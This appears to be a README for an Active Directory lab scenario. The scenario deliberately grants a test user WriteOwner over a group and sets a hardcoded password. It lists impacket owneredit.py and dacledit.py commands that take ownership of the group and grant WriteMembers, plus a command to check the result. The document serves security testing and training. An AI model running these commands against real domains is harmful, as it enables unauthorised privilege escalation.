# acl-writeowner

User with WriteOwner on a group. Creates `scn-acl-wo-attacker` (password `Aa1234567890!`) and the group `scn-acl-wo-group`, and gives the attacker `WriteOwner` (inheritance `None`) on it.

Attack:

    owneredit.py -action write -new-owner scn-acl-wo-attacker -target scn-acl-wo-group <domain>/scn-acl-wo-attacker:'Aa1234567890!' -dc-ip <dc ip>
    dacledit.py -action write -rights WriteMembers -principal scn-acl-wo-attacker -target scn-acl-wo-group <domain>/scn-acl-wo-attacker:'Aa1234567890!' -dc-ip <dc ip>

How to verify:

    dacledit.py -action read -principal scn-acl-wo-attacker -target scn-acl-wo-group <domain>/scn-acl-wo-attacker:'Aa1234567890!' -dc-ip <dc ip>   # shows WriteOwner

Disable deletes both objects (the ACE goes with the target).
